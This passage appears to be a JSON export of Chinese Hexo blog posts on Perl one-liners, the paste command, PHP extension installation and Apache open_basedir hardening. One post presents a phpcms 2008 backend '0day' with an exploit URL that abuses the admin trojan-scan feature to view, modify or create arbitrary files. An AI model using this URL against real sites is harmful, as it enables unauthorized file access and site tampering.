file1\n相应的命令有吗？有……不过挺偏，tac（cat的反转）\n数值计算\n10进制转16进制：\nperl  -ne  'printf \"%xn\",$_'\n10进制转8进制： perl -ne 'printf \"%on\",$_'\n16进制转10进制：\nperl -ne 'print  hex($_).\"n\"'\n8进制转10进制：\nperl -ne 'print  oct($_).\"n\"'\n简易计算器。\nperl -ne 'print  eval($_).\"n\"'\n其他\n启动交互式perl：\nperl -de 1\n查看包含路径的内容：\nperl -le 'print for @INC'\n备注\n与One-Liner相关的Perl命令行参数：\n-0&lt;数字>\n(用8进制表示)指定记录分隔符($/变量)，默认为换行\n-00\n段落模式，即以连续换行为分隔符\n-0777\n禁用分隔符，即将整个文件作为一个记录\n-a\n自动分隔模式，用空格分隔$_并保存到@F中。相当于@F = split ''。分隔符可以使用-F参数指定\n-F\n指定-a的分隔符，可以使用正则表达式\n-e\n执行指定的脚本。\n-i&lt;扩展名>\n原地替换文件，并将旧文件用指定的扩展名备份。不指定扩展名则不备份。\n-l\n对输入内容自动chomp，对输出内容自动添加换行\n-n\n自动循环，相当于 while(&lt;>) { 脚本; }\n-p\n自动循环+自动输出，相当于 while(&lt;>) { 脚本; print; }","slug":"perl-命令行常用语法","published":1,"updated":"2023-04-22T05:38:44.877Z","_id":"clgrjlxiq005r7opi8g2o5uuq","comments":1,"layout":"post","photos":[],"link":"","content":"<p>替换<br>将所有C程序中的foo替换成bar，旧文件备份成.bak<br>perl -p -i.bak -e ‘s&#x2F;bfoob&#x2F;bar&#x2F;g’ *.c<br>很强大的功能，特别是在大程序中做重构。记得只有在UltraEdit用过。 如果你不想备份，就直接写成 perl -p -i -e 或者更简单 perl -pie， 恩，pie这个单词不错<br>将每个文件中出现的数值都加一<br>perl -i.bak -pe ‘s&#x2F;(d+)&#x2F; 1 + $1 &#x2F;ge’ file1 file2 ….<br>将换行符rn替换成n<br>perl -pie ‘s&#x2F;rn&#x2F;n&#x2F;g’ file<br>同dos2unix命令。<br>将换行符n替换成rn<br>perl -pie ‘s&#x2F;n&#x2F;rn&#x2F;g’ file<br>同unix2dos命令。<br>取出文件的一部分<br>显示字段0-4和字段6，字段的分隔符是空格<br>perl -lane ‘print “@F[0..4] $F[6]”‘ file<br>很好很强大，同 awk ‘print $1, $2, $3, $4, $5, $7’。参数名称lane也很好记。<br>如果字段分隔符不是空格而是冒号，则用<br>perl -F: -lane ‘print “@F[0..4]n”‘ &#x2F;etc&#x2F;passwd<br>显示START和END之间的部分<br>perl -ne ‘print if &#x2F;^START$&#x2F; .. &#x2F;^END$&#x2F;‘ file<br>恐怕这个操作只有sed才做得到了吧……<br>相反，不显示START和END之间的部分<br>perl -ne ‘print unless &#x2F;^START$&#x2F; .. &#x2F;^END$&#x2F;‘ file<br>显示开头50行：<br>perl -pe ‘exit if $. &gt; 50’ file<br>同命令 head -n 50<br>不显示开头10行：<br>perl -ne ‘print unless 1 .. 10’ file<br>显示15行到17行：<br>perl -ne ‘print if 15 .. 17’ file<br>每行取前80个字符：<br>perl -lne ‘print substr($<em>, 0, 80) &#x3D; “”‘ file<br>每行丢弃前10个字符：<br>perl -lne ‘print substr($</em>, 10) &#x3D; “”‘ file<br>搜索<br>查找comment字符串：<br>perl -ne ‘print if &#x2F;comment&#x2F;‘ duptext<br>这个就是普通的grep命令了。<br>查找不含comment字符串的行：<br>perl -ne ‘print unless &#x2F;comment&#x2F;‘ duptext<br>反向的grep，即grep -v。<br>查找包含comment或apple的行：<br>perl -ne ‘print if &#x2F;comment&#x2F; || &#x2F;apple&#x2F;‘ duptext<br>相同的功能就要用到egrep了，语法比较复杂，我不会……<br>计算<br>计算字段4和倒数第二字段之和：<br>perl -lane ‘print $F[4] + $F[-2]’<br>要是用awk，就得写成 awk ‘{i&#x3D;NF-1;print $5+$i}’<br>排序和反转<br>文件按行排序：<br>perl -e ‘print sort &lt;&gt;’ file<br>相当于简单的sort命令。<br>文件按段落排序：<br>perl -00 -e ‘print sort &lt;&gt;’ file<br>多个文件按文件内容排序，并返回合并后的文件：<br>perl -0777 -e ‘print sort &lt;&gt;’ file1 file2<br>文件按行反转：<br>perl -e ‘print reverse &lt;&gt;’ file1<br>相应的命令有吗？有……不过挺偏，tac（cat的反转）<br>数值计算<br>10进制转16进制：<br>perl  -ne  ‘printf “%xn”,$<em>‘<br>10进制转8进制： perl -ne ‘printf “%on”,$</em>‘<br>16进制转10进制：<br>perl -ne ‘print  hex($<em>).”n”‘<br>8进制转10进制：<br>perl -ne ‘print  oct($</em>).”n”‘<br>简易计算器。<br>perl -ne ‘print  eval($_).”n”‘<br>其他<br>启动交互式perl：<br>perl -de 1<br>查看包含路径的内容：<br>perl -le ‘print for @INC’<br>备注<br>与One-Liner相关的Perl命令行参数：<br>-0&lt;数字&gt;<br>(用8进制表示)指定记录分隔符($&#x2F;变量)，默认为换行<br>-00<br>段落模式，即以连续换行为分隔符<br>-0777<br>禁用分隔符，即将整个文件作为一个记录<br>-a<br>自动分隔模式，用空格分隔$_并保存到@F中。相当于@F &#x3D; split ‘’。分隔符可以使用-F参数指定<br>-F<br>指定-a的分隔符，可以使用正则表达式<br>-e<br>执行指定的脚本。<br>-i&lt;扩展名&gt;<br>原地替换文件，并将旧文件用指定的扩展名备份。不指定扩展名则不备份。<br>-l<br>对输入内容自动chomp，对输出内容自动添加换行<br>-n<br>自动循环，相当于 while(&lt;&gt;) { 脚本; }<br>-p<br>自动循环+自动输出，相当于 while(&lt;&gt;) { 脚本; print; }</p>\n","site":{"data":{}},"excerpt":"","more":"<p>替换<br>将所有C程序中的foo替换成bar，旧文件备份成.bak<br>perl -p -i.bak -e ‘s&#x2F;bfoob&#x2F;bar&#x2F;g’ *.c<br>很强大的功能，特别是在大程序中做重构。记得只有在UltraEdit用过。 如果你不想备份，就直接写成 perl -p -i -e 或者更简单 perl -pie， 恩，pie这个单词不错<br>将每个文件中出现的数值都加一<br>perl -i.bak -pe ‘s&#x2F;(d+)&#x2F; 1 + $1 &#x2F;ge’ file1 file2 ….<br>将换行符rn替换成n<br>perl -pie ‘s&#x2F;rn&#x2F;n&#x2F;g’ file<br>同dos2unix命令。<br>将换行符n替换成rn<br>perl -pie ‘s&#x2F;n&#x2F;rn&#x2F;g’ file<br>同unix2dos命令。<br>取出文件的一部分<br>显示字段0-4和字段6，字段的分隔符是空格<br>perl -lane ‘print “@F[0..4] $F[6]”‘ file<br>很好很强大，同 awk ‘print $1, $2, $3, $4, $5, $7’。参数名称lane也很好记。<br>如果字段分隔符不是空格而是冒号，则用<br>perl -F: -lane ‘print “@F[0..4]n”‘ &#x2F;etc&#x2F;passwd<br>显示START和END之间的部分<br>perl -ne ‘print if &#x2F;^START$&#x2F; .. &#x2F;^END$&#x2F;‘ file<br>恐怕这个操作只有sed才做得到了吧……<br>相反，不显示START和END之间的部分<br>perl -ne ‘print unless &#x2F;^START$&#x2F; .. &#x2F;^END$&#x2F;‘ file<br>显示开头50行：<br>perl -pe ‘exit if $. &gt; 50’ file<br>同命令 head -n 50<br>不显示开头10行：<br>perl -ne ‘print unless 1 .. 10’ file<br>显示15行到17行：<br>perl -ne ‘print if 15 .. 17’ file<br>每行取前80个字符：<br>perl -lne ‘print substr($<em>, 0, 80) &#x3D; “”‘ file<br>每行丢弃前10个字符：<br>perl -lne ‘print substr($</em>, 10) &#x3D; “”‘ file<br>搜索<br>查找comment字符串：<br>perl -ne ‘print if &#x2F;comment&#x2F;‘ duptext<br>这个就是普通的grep命令了。<br>查找不含comment字符串的行：<br>perl -ne ‘print unless &#x2F;comment&#x2F;‘ duptext<br>反向的grep，即grep -v。<br>查找包含comment或apple的行：<br>perl -ne ‘print if &#x2F;comment&#x2F; || &#x2F;apple&#x2F;‘ duptext<br>相同的功能就要用到egrep了，语法比较复杂，我不会……<br>计算<br>计算字段4和倒数第二字段之和：<br>perl -lane ‘print $F[4] + $F[-2]’<br>要是用awk，就得写成 awk ‘{i&#x3D;NF-1;print $5+$i}’<br>排序和反转<br>文件按行排序：<br>perl -e ‘print sort &lt;&gt;’ file<br>相当于简单的sort命令。<br>文件按段落排序：<br>perl -00 -e ‘print sort &lt;&gt;’ file<br>多个文件按文件内容排序，并返回合并后的文件：<br>perl -0777 -e ‘print sort &lt;&gt;’ file1 file2<br>文件按行反转：<br>perl -e ‘print reverse &lt;&gt;’ file1<br>相应的命令有吗？有……不过挺偏，tac（cat的反转）<br>数值计算<br>10进制转16进制：<br>perl  -ne  ‘printf “%xn”,$<em>‘<br>10进制转8进制： perl -ne ‘printf “%on”,$</em>‘<br>16进制转10进制：<br>perl -ne ‘print  hex($<em>).”n”‘<br>8进制转10进制：<br>perl -ne ‘print  oct($</em>).”n”‘<br>简易计算器。<br>perl -ne ‘print  eval($_).”n”‘<br>其他<br>启动交互式perl：<br>perl -de 1<br>查看包含路径的内容：<br>perl -le ‘print for @INC’<br>备注<br>与One-Liner相关的Perl命令行参数：<br>-0&lt;数字&gt;<br>(用8进制表示)指定记录分隔符($&#x2F;变量)，默认为换行<br>-00<br>段落模式，即以连续换行为分隔符<br>-0777<br>禁用分隔符，即将整个文件作为一个记录<br>-a<br>自动分隔模式，用空格分隔$_并保存到@F中。相当于@F &#x3D; split ‘’。分隔符可以使用-F参数指定<br>-F<br>指定-a的分隔符，可以使用正则表达式<br>-e<br>执行指定的脚本。<br>-i&lt;扩展名&gt;<br>原地替换文件，并将旧文件用指定的扩展名备份。不指定扩展名则不备份。<br>-l<br>对输入内容自动chomp，对输出内容自动添加换行<br>-n<br>自动循环，相当于 while(&lt;&gt;) { 脚本; }<br>-p<br>自动循环+自动输出，相当于 while(&lt;&gt;) { 脚本; print; }</p>\n"},{"title":"php2008漏洞后台上传0day漏洞","date":"2011-06-23T08:45:00.000Z","_content":"<p>&nbsp;phpcms扫描木马功能，发现木马后，可以查看修改。</p><p>只要指定文件可以查看，可以修改，也可以创建，很厉害的功能。</p><p>利用地址：</p><p><a href=\"http://baidu.com/key1088\" target=\"_blank\" rel=\"noopener noreferrer\">http://192.168.0.203/phpcms/admin.php?mod=phpcms&amp;file=safe&amp;action=see_code&amp;files=uploadfile/test.php</a></p><p><img src=\"/images/pic/c11a73f4fd77417d720eeca6.jpg\" small=\"0\" /><br /></p><p></p><p></p><p></p><p></p><p></p>","source":"_posts/php2008漏洞后台上传0day漏洞.md","raw":"title: php2008漏洞后台上传0day漏洞\ncategories: [网络安全]\ntags: []\ndate: 2011-06-23 16:45:00\n---\n<p>&nbsp;phpcms扫描木马功能，发现木马后，可以查看修改。</p><p>只要指定文件可以查看，可以修改，也可以创建，很厉害的功能。</p><p>利用地址：</p><p><a href=\"http://baidu.com/key1088\" target=\"_blank\" rel=\"noopener noreferrer\">http://192.168.0.203/phpcms/admin.php?mod=phpcms&amp;file=safe&amp;action=see_code&amp;files=uploadfile/test.php</a></p><p><img src=\"/images/pic/c11a73f4fd77417d720eeca6.jpg\" small=\"0\" /><br /></p><p></p><p></p><p></p><p></p><p></p>","slug":"php2008漏洞后台上传0day漏洞","published":1,"updated":"2023-04-22T05:38:44.882Z","_id":"clgrjlxir005t7opiah8971pd","comments":1,"layout":"post","photos":[],"link":"","content":"<p>&nbsp;phpcms扫描木马功能，发现木马后，可以查看修改。</p><p>只要指定文件可以查看，可以修改，也可以创建，很厉害的功能。</p><p>利用地址：</p><p><a href=\"http://baidu.com/key1088\" target=\"_blank\" rel=\"noopener noreferrer\">http://192.168.0.203/phpcms/admin.php?mod=phpcms&amp;file=safe&amp;action=see_code&amp;files=uploadfile/test.php</a></p><p><img src=\"/images/pic/c11a73f4fd77417d720eeca6.jpg\" small=\"0\" /><br /></p><p></p><p></p><p></p><p></p><p></p>","site":{"data":{}},"excerpt":"","more":"<p>&nbsp;phpcms扫描木马功能，发现木马后，可以查看修改。</p><p>只要指定文件可以查看，可以修改，也可以创建，很厉害的功能。</p><p>利用地址：</p><p><a href=\"http://baidu.com/key1088\" target=\"_blank\" rel=\"noopener noreferrer\">http://192.168.0.203/phpcms/admin.php?mod=phpcms&amp;file=safe&amp;action=see_code&amp;files=uploadfile/test.php</a></p><p><img src=\"/images/pic/c11a73f4fd77417d720eeca6.jpg\" small=\"0\" /><br /></p><p></p><p></p><p></p><p></p><p></p>"},{"title":"php_admin_value 函数","date":"2011-09-13T07:27:00.000Z","_content":"&nbsp;\n为了安全，将上传文件的临时目录加入到php_admin_value open_basedir后面：<br />&lt;VirtualHost *:80&gt;\n&nbsp;&nbsp;&nbsp;  php_admin_value open_basedir &quot;/usr/local/apache/htdocs/www:/tmp&quot;\n&nbsp;&nbsp;&nbsp; php_admin_value safe_mode On\n&nbsp;&lt;/VirtualHost&gt;<br />注意：两个目录之间是冒号隔开。\n即使拿到该站点的webshell也看不到其他站点的东西。<br />\nmove_uploaded_file不受open_basedir的限制，所以不必修改php.ini里upload_tmp_dir的值。","source":"_posts/php_admin_value-函数.md","raw":"title: php_admin_value 函数\ncategories: [Php编程]\ntags: []\ndate: 2011-09-13 15:27:00\n---\n&nbsp;\n为了安全，将上传文件的临时目录加入到php_admin_value open_basedir后面：<br />&lt;VirtualHost *:80&gt;\n&nbsp;&nbsp;&nbsp;  php_admin_value open_basedir &quot;/usr/local/apache/htdocs/www:/tmp&quot;\n&nbsp;&nbsp;&nbsp; php_admin_value safe_mode On\n&nbsp;&lt;/VirtualHost&gt;<br />注意：两个目录之间是冒号隔开。\n即使拿到该站点的webshell也看不到其他站点的东西。<br />\nmove_uploaded_file不受open_basedir的限制，所以不必修改php.ini里upload_tmp_dir的值。","slug":"php_admin_value-函数","published":1,"updated":"2023-04-22T05:38:44.884Z","_id":"clgrjlxis005w7opifj7mgg0x","comments":1,"layout":"post","photos":[],"link":"","content":"<p>&amp;nbsp;<br>为了安全，将上传文件的临时目录加入到php_admin_value open_basedir后面：<br />&lt;VirtualHost *:80&gt;<br>&amp;nbsp;&amp;nbsp;&amp;nbsp;  php_admin_value open_basedir &quot;&#x2F;usr&#x2F;local&#x2F;apache&#x2F;htdocs&#x2F;www:&#x2F;tmp&quot;<br>&amp;nbsp;&amp;nbsp;&amp;nbsp; php_admin_value safe_mode On<br>&amp;nbsp;&lt;&#x2F;VirtualHost&gt;<br />注意：两个目录之间是冒号隔开。<br>即使拿到该站点的webshell也看不到其他站点的东西。<br /><br>move_uploaded_file不受open_basedir的限制，所以不必修改php.ini里upload_tmp_dir的值。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>&amp;nbsp;<br>为了安全，将上传文件的临时目录加入到php_admin_value open_basedir后面：<br />&lt;VirtualHost *:80&gt;<br>&amp;nbsp;&amp;nbsp;&amp;nbsp;  php_admin_value open_basedir &quot;&#x2F;usr&#x2F;local&#x2F;apache&#x2F;htdocs&#x2F;www:&#x2F;tmp&quot;<br>&amp;nbsp;&amp;nbsp;&amp;nbsp; php_admin_value safe_mode On<br>&amp;nbsp;&lt;&#x2F;VirtualHost&gt;<br />注意：两个目录之间是冒号隔开。<br>即使拿到该站点的webshell也看不到其他站点的东西。<br /><br>move_uploaded_file不受open_basedir的限制，所以不必修改php.ini里upload_tmp_dir的值。</p>\n"},{"title":"paste 命令","date":"2011-11-06T07:10:00.000Z","_content":"<p></p><p></p><p>linux下命令使用详解---合并文件的列</p><p>&nbsp;</p><p>功能说明：合并文件的列。</p><p>&nbsp;</p><p>语　　法：paste [-s][-d ][--help][--version][文件...]</p><p>补充说明：paste指令会把每个文件以列对列的方式，一列列地加以合并。</p><p>参　　数：</p><p>　-d或--delimiters= 　用指定的间隔字符取代跳格字符。</p><p>　-s或--serial 　串列进行而非平行处理。</p><p>　--help 　在线帮助。</p><p>　--version 　显示帮助信息。</p><p>&nbsp;</p><p>例:</p><p>&nbsp;</p><p>1.paste的拼凑原理是什么?</p><p>&nbsp;</p><p>这个很简单，和cut的原理几乎一样，就是将几个文件的相应行用制表符连接起来，并输出到标准输出。</p><p>&nbsp;</p><p>paste最简单的使用方法是：</p><p>&nbsp;</p><p>[rocrocket@rocrocket programming]$ cat p1.txt</p><p>&nbsp;</p><p>123[rocrocket@rocrocket programming]$ cat p2.txt</p><p>a</p><p>b</p><p>c</p><p>[rocrocket@rocrocket programming]$ paste p1.txt p2.txt</p><p>1 &nbsp; &nbsp;a</p><p>2 &nbsp; &nbsp;b</p><p>3 &nbsp; &nbsp;c</p><p>[rocrocket@rocrocket programming]$ paste p1.txt p2.txt|sed-n l</p><p>1ta$</p><p>2tb$</p><p>3tc$</p><p>看到制表符了吧，它就是默认的间隔符。</p><p>&nbsp;</p><p>2 上面的例子是两个文件的，那三个文件呢？</p><p>&nbsp;</p><p>当然也可以了。看看例子吧：</p><p>&nbsp;</p><p>[rocrocket@rocrocket programming]$ cat p3.txt</p><p>I</p><p>II</p><p>III</p><p>[rocrocket@rocrocket programming]$ paste p1.txt p2.txt p3.txt</p><p>1 &nbsp; &nbsp;a &nbsp; &nbsp;I</p><p>2 &nbsp; &nbsp;b &nbsp; &nbsp;II</p><p>3 &nbsp; &nbsp;c &nbsp; &nbsp;III</p><p>[rocrocket@rocrocket programming]$ paste p3.txt p2.txt p1.txt</p><p>I &nbsp; &nbsp;a &nbsp; &nbsp;1</p><p>II &nbsp; b &nbsp; &nbsp;2</p><p>III &nbsp;c &nbsp; &nbsp;3</p><p>可见paste的结果是和文件列表的顺序有关的。</p><p>&nbsp;</p><p>3 我不想用制表符来间隔，我想用星号(*)，可以么？</p><p>&nbsp;</p><p>行的！使用-d符号就可以设定间隔符，这和cut没有两样。看看例子：</p><p>&nbsp;</p><p>[rocrocket@rocrocket programming]$ paste -d'*' p3.txt p2.txt p1.txt</p><p>I*a*1</p><p>II*b*2</p><p>III*c*3</p><p>要注意一点，此处一定要把星号用引号括起来哦（单引号双引号均可），否则shell会把星号扩展为当前目录下的文件列表哦，小心小心。</p><p>&nbsp;</p><p>4 我看过paste命令的man，里面提到了一个-s选项，我不懂是什么意思？</p><p>&nbsp;</p><p>这个很好解释，继续上面的例子，看看这个命令：</p><p>&nbsp;</p><p>[rocrocket@rocrocket programming]$ paste -s-d&quot;*&quot; p3.txt p2.txt p1.txt</p><p>I*II*III</p><p>a*b*c</p><p>1*2*3</p><p>呵呵，懂了吧，-s就是以每个文件为一个处理单元，将其中的所有行以-d设定的间隔符相连接组成一大行，输出到标准输出中。</p><p>&nbsp;</p><p></p><p></p>","source":"_posts/paste-命令.md","raw":"title: paste 命令\ncategories: [Linux,Shell编程]\ntags: []\ndate: 2011-11-06 15:10:00\n---\n<p></p><p></p><p>linux下命令使用详解---合并文件的列</p><p>&nbsp;</p><p>功能说明：合并文件的列。</p><p>&nbsp;</p><p>语　　法：paste [-s][-d ][--help][--version][文件...]</p><p>补充说明：paste指令会把每个文件以列对列的方式，一列列地加以合并。</p><p>参　　数：</p><p>　-d或--delimiters= 　用指定的间隔字符取代跳格字符。</p><p>　-s或--serial 　串列进行而非平行处理。</p><p>　--help 　在线帮助。</p><p>　--version 　显示帮助信息。</p><p>&nbsp;</p><p>例:</p><p>&nbsp;</p><p>1.paste的拼凑原理是什么?</p><p>&nbsp;</p><p>这个很简单，和cut的原理几乎一样，就是将几个文件的相应行用制表符连接起来，并输出到标准输出。</p><p>&nbsp;</p><p>paste最简单的使用方法是：</p><p>&nbsp;</p><p>[rocrocket@rocrocket programming]$ cat p1.txt</p><p>&nbsp;</p><p>123[rocrocket@rocrocket programming]$ cat p2.txt</p><p>a</p><p>b</p><p>c</p><p>[rocrocket@rocrocket programming]$ paste p1.txt p2.txt</p><p>1 &nbsp; &nbsp;a</p><p>2 &nbsp; &nbsp;b</p><p>3 &nbsp; &nbsp;c</p><p>[rocrocket@rocrocket programming]$ paste p1.txt p2.txt|sed-n l</p><p>1ta$</p><p>2tb$</p><p>3tc$</p><p>看到制表符了吧，它就是默认的间隔符。</p><p>&nbsp;</p><p>2 上面的例子是两个文件的，那三个文件呢？</p><p>&nbsp;</p><p>当然也可以了。看看例子吧：</p><p>&nbsp;</p><p>[rocrocket@rocrocket programming]$ cat p3.txt</p><p>I</p><p>II</p><p>III</p><p>[rocrocket@rocrocket programming]$ paste p1.txt p2.txt p3.txt</p><p>1 &nbsp; &nbsp;a &nbsp; &nbsp;I</p><p>2 &nbsp; &nbsp;b &nbsp; &nbsp;II</p><p>3 &nbsp; &nbsp;c &nbsp; &nbsp;III</p><p>[rocrocket@rocrocket programming]$ paste p3.txt p2.txt p1.txt</p><p>I &nbsp; &nbsp;a &nbsp; &nbsp;1</p><p>II &nbsp; b &nbsp; &nbsp;2</p><p>III &nbsp;c &nbsp; &nbsp;3</p><p>可见paste的结果是和文件列表的顺序有关的。</p><p>&nbsp;</p><p>3 我不想用制表符来间隔，我想用星号(*)，可以么？</p><p>&nbsp;</p><p>行的！使用-d符号就可以设定间隔符，这和cut没有两样。看看例子：</p><p>&nbsp;</p><p>[rocrocket@rocrocket programming]$ paste -d'*' p3.txt p2.txt p1.txt</p><p>I*a*1</p><p>II*b*2</p><p>III*c*3</p><p>要注意一点，此处一定要把星号用引号括起来哦（单引号双引号均可），否则shell会把星号扩展为当前目录下的文件列表哦，小心小心。</p><p>&nbsp;</p><p>4 我看过paste命令的man，里面提到了一个-s选项，我不懂是什么意思？</p><p>&nbsp;</p><p>这个很好解释，继续上面的例子，看看这个命令：</p><p>&nbsp;</p><p>[rocrocket@rocrocket programming]$ paste -s-d&quot;*&quot; p3.txt p2.txt p1.txt</p><p>I*II*III</p><p>a*b*c</p><p>1*2*3</p><p>呵呵，懂了吧，-s就是以每个文件为一个处理单元，将其中的所有行以-d设定的间隔符相连接组成一大行，输出到标准输出中。</p><p>&nbsp;</p><p></p><p></p>","slug":"paste-命令","published":1,"updated":"2023-04-22T05:38:44.874Z","_id":"clgrjlxit005y7opi91pk8vbn","comments":1,"layout":"post","photos":[],"link":"","content":"<p></p><p></p><p>linux下命令使用详解---合并文件的列</p><p>&nbsp;</p><p>功能说明：合并文件的列。</p><p>&nbsp;</p><p>语　　法：paste [-s][-d ][--help][--version][文件...]</p><p>补充说明：paste指令会把每个文件以列对列的方式，一列列地加以合并。</p><p>参　　数：</p><p>　-d或--delimiters= 　用指定的间隔字符取代跳格字符。</p><p>　-s或--serial 　串列进行而非平行处理。</p><p>　--help 　在线帮助。</p><p>　--version 　显示帮助信息。</p><p>&nbsp;</p><p>例:</p><p>&nbsp;</p><p>1.paste的拼凑原理是什么?</p><p>&nbsp;</p><p>这个很简单，和cut的原理几乎一样，就是将几个文件的相应行用制表符连接起来，并输出到标准输出。</p><p>&nbsp;</p><p>paste最简单的使用方法是：</p><p>&nbsp;</p><p>[rocrocket@rocrocket programming]$ cat p1.txt</p><p>&nbsp;</p><p>123[rocrocket@rocrocket programming]$ cat p2.txt</p><p>a</p><p>b</p><p>c</p><p>[rocrocket@rocrocket programming]$ paste p1.txt p2.txt</p><p>1 &nbsp; &nbsp;a</p><p>2 &nbsp; &nbsp;b</p><p>3 &nbsp; &nbsp;c</p><p>[rocrocket@rocrocket programming]$ paste p1.txt p2.txt|sed-n l</p><p>1ta$</p><p>2tb$</p><p>3tc$</p><p>看到制表符了吧，它就是默认的间隔符。</p><p>&nbsp;</p><p>2 上面的例子是两个文件的，那三个文件呢？</p><p>&nbsp;</p><p>当然也可以了。看看例子吧：</p><p>&nbsp;</p><p>[rocrocket@rocrocket programming]$ cat p3.txt</p><p>I</p><p>II</p><p>III</p><p>[rocrocket@rocrocket programming]$ paste p1.txt p2.txt p3.txt</p><p>1 &nbsp; &nbsp;a &nbsp; &nbsp;I</p><p>2 &nbsp; &nbsp;b &nbsp; &nbsp;II</p><p>3 &nbsp; &nbsp;c &nbsp; &nbsp;III</p><p>[rocrocket@rocrocket programming]$ paste p3.txt p2.txt p1.txt</p><p>I &nbsp; &nbsp;a &nbsp; &nbsp;1</p><p>II &nbsp; b &nbsp; &nbsp;2</p><p>III &nbsp;c &nbsp; &nbsp;3</p><p>可见paste的结果是和文件列表的顺序有关的。</p><p>&nbsp;</p><p>3 我不想用制表符来间隔，我想用星号(*)，可以么？</p><p>&nbsp;</p><p>行的！使用-d符号就可以设定间隔符，这和cut没有两样。看看例子：</p><p>&nbsp;</p><p>[rocrocket@rocrocket programming]$ paste -d'*' p3.txt p2.txt p1.txt</p><p>I*a*1</p><p>II*b*2</p><p>III*c*3</p><p>要注意一点，此处一定要把星号用引号括起来哦（单引号双引号均可），否则shell会把星号扩展为当前目录下的文件列表哦，小心小心。</p><p>&nbsp;</p><p>4 我看过paste命令的man，里面提到了一个-s选项，我不懂是什么意思？</p><p>&nbsp;</p><p>这个很好解释，继续上面的例子，看看这个命令：</p><p>&nbsp;</p><p>[rocrocket@rocrocket programming]$ paste -s-d&quot;*&quot; p3.txt p2.txt p1.txt</p><p>I*II*III</p><p>a*b*c</p><p>1*2*3</p><p>呵呵，懂了吧，-s就是以每个文件为一个处理单元，将其中的所有行以-d设定的间隔符相连接组成一大行，输出到标准输出中。</p><p>&nbsp;</p><p></p><p></p>","site":{"data":{}},"excerpt":"","more":"<p></p><p></p><p>linux下命令使用详解---合并文件的列</p><p>&nbsp;</p><p>功能说明：合并文件的列。</p><p>&nbsp;</p><p>语　　法：paste [-s][-d ][--help][--version][文件...]</p><p>补充说明：paste指令会把每个文件以列对列的方式，一列列地加以合并。</p><p>参　　数：</p><p>　-d或--delimiters= 　用指定的间隔字符取代跳格字符。</p><p>　-s或--serial 　串列进行而非平行处理。</p><p>　--help 　在线帮助。</p><p>　--version 　显示帮助信息。</p><p>&nbsp;</p><p>例:</p><p>&nbsp;</p><p>1.paste的拼凑原理是什么?</p><p>&nbsp;</p><p>这个很简单，和cut的原理几乎一样，就是将几个文件的相应行用制表符连接起来，并输出到标准输出。</p><p>&nbsp;</p><p>paste最简单的使用方法是：</p><p>&nbsp;</p><p>[rocrocket@rocrocket programming]$ cat p1.txt</p><p>&nbsp;</p><p>123[rocrocket@rocrocket programming]$ cat p2.txt</p><p>a</p><p>b</p><p>c</p><p>[rocrocket@rocrocket programming]$ paste p1.txt p2.txt</p><p>1 &nbsp; &nbsp;a</p><p>2 &nbsp; &nbsp;b</p><p>3 &nbsp; &nbsp;c</p><p>[rocrocket@rocrocket programming]$ paste p1.txt p2.txt|sed-n l</p><p>1ta$</p><p>2tb$</p><p>3tc$</p><p>看到制表符了吧，它就是默认的间隔符。</p><p>&nbsp;</p><p>2 上面的例子是两个文件的，那三个文件呢？</p><p>&nbsp;</p><p>当然也可以了。看看例子吧：</p><p>&nbsp;</p><p>[rocrocket@rocrocket programming]$ cat p3.txt</p><p>I</p><p>II</p><p>III</p><p>[rocrocket@rocrocket programming]$ paste p1.txt p2.txt p3.txt</p><p>1 &nbsp; &nbsp;a &nbsp; &nbsp;I</p><p>2 &nbsp; &nbsp;b &nbsp; &nbsp;II</p><p>3 &nbsp; &nbsp;c &nbsp; &nbsp;III</p><p>[rocrocket@rocrocket programming]$ paste p3.txt p2.txt p1.txt</p><p>I &nbsp; &nbsp;a &nbsp; &nbsp;1</p><p>II &nbsp; b &nbsp; &nbsp;2</p><p>III &nbsp;c &nbsp; &nbsp;3</p><p>可见paste的结果是和文件列表的顺序有关的。</p><p>&nbsp;</p><p>3 我不想用制表符来间隔，我想用星号(*)，可以么？</p><p>&nbsp;</p><p>行的！使用-d符号就可以设定间隔符，这和cut没有两样。看看例子：</p><p>&nbsp;</p><p>[rocrocket@rocrocket programming]$ paste -d'*' p3.txt p2.txt p1.txt</p><p>I*a*1</p><p>II*b*2</p><p>III*c*3</p><p>要注意一点，此处一定要把星号用引号括起来哦（单引号双引号均可），否则shell会把星号扩展为当前目录下的文件列表哦，小心小心。</p><p>&nbsp;</p><p>4 我看过paste命令的man，里面提到了一个-s选项，我不懂是什么意思？</p><p>&nbsp;</p><p>这个很好解释，继续上面的例子，看看这个命令：</p><p>&nbsp;</p><p>[rocrocket@rocrocket programming]$ paste -s-d&quot;*&quot; p3.txt p2.txt p1.txt</p><p>I*II*III</p><p>a*b*c</p><p>1*2*3</p><p>呵呵，懂了吧，-s就是以每个文件为一个处理单元，将其中的所有行以-d设定的间隔符相连接组成一大行，输出到标准输出中。</p><p>&nbsp;</p><p></p><p></p>"},{"title":"php 添加扩展模块","date":"2011-12-02T02:49:00.000Z","_content":"<p>线上想用zabbix做监控。php安装的时候有很多模块没有安装，mbstring就是其中一个，所以现在要扩展安装一下。</p><p>就拿mbstring为例吧</p><p>环境php5.2.14, 不支持mbstring扩展</p><p>上传php源码，tar 之。<br />shell&gt;cd /usr/local/src/php-5.2.14/ext</p><p>shell&gt;ls&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #下面都模块源码，想安装那个就进那个目录</p><p>shell&gt;cd mbstring</p><p>shell&gt;phpize<br />shell&gt;./configure --with-php-config=/usr/local/php/bin/php-config&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #指定php-config文件<br />shell&gt;make<br />shell&gt;make install&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #看这一步的输出可以看出是模块的目录,我的是/usr/local/php/lib/php/extensions/no-debug-non-zts-20060613</p><p>shell&gt;vim /usr/local/php/lib/php.ini&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #编辑php.ini添加扩展目录。</p><p>extension_dir=/usr/local/php/lib/php/extensions/no-debug-non-zts-20060613</p><p>extension=mbstring.so</p><p>重启一个web服务，用phpinfo看看是否支持mbstring。<br 